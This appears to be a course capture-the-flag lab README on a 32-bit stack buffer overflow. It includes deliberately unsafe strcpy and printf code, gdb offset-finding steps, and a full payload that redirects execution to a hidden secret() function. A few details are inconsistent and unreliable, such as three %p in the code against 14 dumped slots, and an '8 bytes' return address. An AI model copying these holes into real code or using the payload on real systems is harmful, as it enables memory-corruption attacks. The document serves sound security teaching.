# Stack-visualizer lab — watch the overwrite happen

> ### ⚠ Deliberately vulnerable, container-only
> This binary is built 32-bit with stack protections **off on purpose** (see
> the Dockerfile). It runs inside a throwaway container bound to nothing, and
> the flag is a made-up string. Overflowing it *inside the box* is the
> exercise. Never build real software this way, and only practise these
> techniques on software you own or are authorised to test. The week-10 README
> has the full scope/legal note.

This is the program from the lecture slides, made runnable. Instead of
*reasoning* about how a too-long `strcpy` runs over the saved return address,
you will **see it** — the program prints the raw stack before and after the
copy, so you can watch your own input land on the stack and, eventually,
overwrite the address the function returns to. Then you aim that overwrite at a
hidden `secret()` function to capture the flag.

It pairs with [`../buffer-overflow/`](../buffer-overflow/): that lab is the same
idea with real 64-bit CTF tooling (`pwntools`, `gdb`, cyclic patterns); *this*
one is the illustrated, see-every-byte version. Do this one first if the other
felt abstract.

---

## The vulnerable program

```c
void X(const char *input) {
    char buf[10];

    // Printing %p with NO arguments is a trick to view the stack.
    printf("My stack looks like:\n ... %p %p %p ... \n");

    strcpy(buf, input);          // <-- the bug: no length check
    printf("buf now holds: \"%s\"\n", buf);

    printf("Now the stack looks like:\n ... %p %p %p ... \n");
}
```

Two things to understand before you run it:

**Why `strcpy` is the bug.** `strcpy(buf, input)` copies bytes from `input`
into `buf` until it reaches a NUL (`\0`) terminator — and it has *no idea* that
`buf` is only 10 bytes. If `input` is longer, it keeps writing past the end of
`buf`, over whatever the compiler placed next to it on the stack.

**Why `printf("%p %p …")` with no arguments dumps the stack.** `%p` tells
`printf` "print a pointer here", so it goes looking for a pointer argument. But
we pass none. In a 32-bit program those arguments would have been passed *on
the stack*, just above `printf`'s own data — so `printf` prints whatever is
sitting in those stack slots instead: `buf`, the saved frame pointer, and the
**saved return address**. It is a cheap window into live stack memory.

### What the statement actually does, slot by slot

`printf` doesn't know how many arguments it got, so it keeps an internal cursor
and, for **each** conversion in the format string, *reads the next 4-byte slot
and moves the cursor up by one slot*. It **reads — it does not pop**: nothing is
removed and the stack pointer never moves, so the slots are left exactly as they
were (that's why the second dump still shows the real stack). The format string
is simply a list of "go read one more slot" instructions:

```
   printf("  %p   %p   %p   %p  ... ");
             1st  2nd  3rd  4th  conversion
              │    │    │    │
              ▼    ▼    ▼    ▼        each conversion reads ONE slot,
   ┌───────────────────────────────┐  then the cursor steps UP to the next
   │  the STACK  (one 4-byte slot   │  (low address at top; nothing removed)
   │             per row)           │
   ├───────────────────────────────┤
   │ 1st read → part of buf         │ → prints 0x……
   │ 2nd read → rest of buf         │ → prints 0x……
   │ 3rd read → saved EBP           │ → prints 0x……
   │ 4th read → SAVED RETURN ADDR   │ → prints 0x804934e   ← the prize
   │   …        …                   │
   └───────────────────────────────┘
      cursor advances one slot per %p ─────────────▲ (reads only; esp unchanged)
```

So the 14 `%p` in `X()` print 14 consecutive stack slots — and because reading
is non-destructive, calling it a second time after `strcpy` shows you the *same*
slots with your overwritten bytes in them.

> **Why 32-bit matters here.** On 32-bit, *all* arguments travel on the stack,
> so the cursor walks the stack cleanly as drawn above. On 64-bit the first few
> arguments come from **registers** instead, so the first several `%p` would
> print leftover register values, not a tidy stack walk — which is exactly why
> this lab is 32-bit.

(Reading is harmless, but note `%s` would go a step further: it reads a slot and
then *dereferences* that value as a string pointer — so a format string with the
wrong specifiers can crash or leak other memory. This whole mismatch of
"more conversions than arguments" is a bug class of its own, a *format-string*
vulnerability; here we only use its read side as a window.)

---

## Build and enter

```bash
cd week-10/stack-visualizer
docker build -t cs440-stackview .
docker run -it --rm cs440-stackview
```

You land as `player` in `/home/player` with the `stackview` binary, its source
in `src/`, and `gdb`, `objdump`, `nm`, `file`, `python3`.

```bash
file stackview
# ELF 32-bit LSB executable, Intel 80386, ... not stripped
```

**32-bit (Intel 80386)** is deliberate — it is what makes the `%p` trick show a
clean walk up the stack, and it gives the tidy 4-byte stack slots and short
code addresses you saw on the slides. The program takes its input as a
command-line argument.

---

## Part 1 — "First, we try a simple input = Hello"

```bash
./stackview Hello
```

```
My stack looks like:
  [ 0] 0xfffcf930   [ 1] 0xf7eea540   [ 2] (nil)   [ 3] 0xfffcf918
  [ 4] 0xf7f058f0   [ 5] 0xfffcf950   [ 6] 0xfffcf930   [ 7] 0x804bf04
  [ 8] 0xf7f26b80   [ 9] 0xfffcf918   [10] 0x804934e   [11] 0xfffd0f7c
  [12] (nil)   [13] 0x2

buf now holds: "Hello"

Now the stack looks like:
  [ 0] 0xfffcf8e6   [ 1] 0xf7eea540   [ 2] (nil)   [ 3] 0xfffcf918
  [ 4] 0x654858f0   [ 5] 0x6f6c6c   [ 6] 0xfffcf930   [ 7] 0x804bf04
  [ 8] 0xf7f26b80   [ 9] 0xfffcf918   [10] 0x804934e   [11] 0xfffd0f7c
  [12] (nil)   [13] 0x2

X() returned normally. (The return address was untouched.)
```

Each `[n]` is one 4-byte stack slot, printed low-address-first, so reading down
the list walks **upward** through memory — exactly the two columns on the
slide. Compare the two dumps slot by slot; only a couple of slots changed.

### Where did "Hello" go? (the key reading skill)

Look at slots **[4]** and **[5]** after the copy — that is `buf`:

- `[4] 0x654858f0` → the bytes `48 65` appeared. ASCII `0x48 = 'H'`, `0x65 =
  'e'`.
- `[5] 0x6f6c6c` → the bytes `6c 6c 6f`. ASCII `0x6c = 'l'`, `0x6f = 'o'`.

So `H e l l o` is sitting right there on the stack. The bytes look "backwards"
(`48 65` reads as the value `0x6548`) because x86 is **little-endian**: the
first byte of a multi-byte value is stored at the lowest address. This is the
same thing the slide shows with `6C6C6548` and `006F`.

### Which slot is the return address?

Slot **[10]** holds `0x804934e`, and unlike the stack addresses (`0xfffc…`) it
did **not** change. That is a code address — the instruction `X()` returns to
when it finishes. Prove it:

```bash
objdump -d stackview | grep -A1 'call.*<X>'
#   8049349:  e8 23 ff ff ff   call   8049271 <X>
#   804934e:  83 c4 10         add    $0x10,%esp     <-- 0x804934e, the return addr
```

`main` does `call X` at `0x8049349`; the very next instruction is `0x804934e`.
When `call` ran, it pushed `0x804934e` onto the stack as the return address —
and there it is in slot [10]. **This is the 8 bytes you want to control.**

> **Note on the addresses you see.** The `0xfffc…` stack addresses change every
> run (the stack is randomised), but the *slot positions* and the *code*
> addresses (slot [10]'s return address, and `secret` later) are fixed because
> this binary is built with no PIE. Work from the slot positions, not the exact
> stack values.

"Hello" (5 bytes) landed far below slot [10], so the return address was safe
and the program returned normally. Now make the input reach it.

---

## Part 2 — make the input longer and watch it collide

The return address sits a fixed number of bytes above the start of `buf`. Find
that number by sending a **marker pattern** of distinct 4-byte blocks and
seeing which block lands on the return slot. Run it under `gdb` so you can read
the crash:

```bash
python3 -c 'print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO")' > /tmp/pat
gdb -q stackview -ex 'run $(cat /tmp/pat)'
```

The copy overruns `buf`, overwrites the return address with some of your
pattern bytes, and when `X()` returns the CPU jumps there and faults:

```text
Program received signal SIGSEGV, Segmentation fault.
gdb> info registers eip
eip   0x47474646   0x47474646
```

`eip` is the 32-bit instruction pointer — the address the CPU tried to execute
next. It holds `0x47474646`, which little-endian is the bytes `46 46 47 47` =
ASCII `F F G G`. In the pattern, the `F`-block is bytes 20–23 and the `G`-block
is 24–27, so `FFGG` straddles **offset 22**. That is the distance from the
start of your input to the return address: **22 bytes of padding, then the
4 bytes that become the new return address.**

Confirm it visually — send 22 filler bytes then four `B`s and look at slot [10]:

```bash
./stackview "$(python3 -c 'print("A"*22 + "BBBB")')"
```

```
Now the stack looks like:
  ...
  [ 8] 0x41414141   [ 9] 0x41414141   [10] 0x42424242   [11] ...
```

Slots [4]–[9] are full of `0x41` (`'A'`), and slot **[10] is now
`0x42424242`** (`'BBBB'`) — **you overwrote the return address.** (The program
crashes a moment later when `X()` returns into `0x42424242`; the unbuffered
dump prints first, so you still see it.)

---

<details>
<summary><b>Part 3 — aim the overwrite (intended solution)</b>. Try it yourself first.</summary>

You can put `0x42424242` on the return slot; now put a *useful* address there —
the hidden `secret()` function, which reads the flag.

### Find secret()'s address

```bash
nm stackview | grep ' secret$'        # ->  080491d6 T secret
objdump -d stackview | grep '<secret>:'   # ->  080491d6 <secret>:
```

`secret` is at **`0x080491d6`**. No PIE, so that is fixed every run (read it off
*your* binary to be sure).

### Build the payload

22 padding bytes, then `0x080491d6` written **little-endian** — lowest byte
first: `d6 91 04 08`. Note none of those four bytes is `0x00`, which matters:
`strcpy` stops at the first NUL, so an address containing a zero byte would cut
the copy short. (Here we are lucky; defeating that constraint is a later
lesson.)

```bash
./stackview "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*22 + b"\xd6\x91\x04\x08")')"
```

```
*** secret() reached: you overwrote the return address! ***
Flag: CS440{strcpy_wrote_right_over_the_return_address}
```

`X()` finished, `ret` popped `0x080491d6` into `eip`, and the CPU "returned"
into `secret()` — a function `main` never called. You chose where the program
went next.

</details>

---

## What this challenge is really teaching

- **The return address is just data on the stack.** You watched it sit in slot
  [10], watched your input reach it, and then replaced it. The CPU re-executes
  whatever 4 bytes are there, no questions asked.
- **`strcpy` trusts the data's length, not the buffer's.** The 10-byte `buf`
  was never the limit; the first NUL in your *input* was. That mismatch is the
  entire bug, and `strcpy`/`gets`/`scanf("%s")` all share it.
- **Little-endian and "no NUL bytes" are real constraints.** You wrote the
  address backwards and checked it had no zero byte — the two gotchas that trip
  up every first exploit.
- **This is the same move everywhere, just dressed differently.** The 64-bit
  `pwntools` version in [`../buffer-overflow/`](../buffer-overflow/) finds the
  offset with a cyclic pattern and packs the address with `p64()` instead of by
  hand — but it is the identical idea you just watched happen slot by slot.
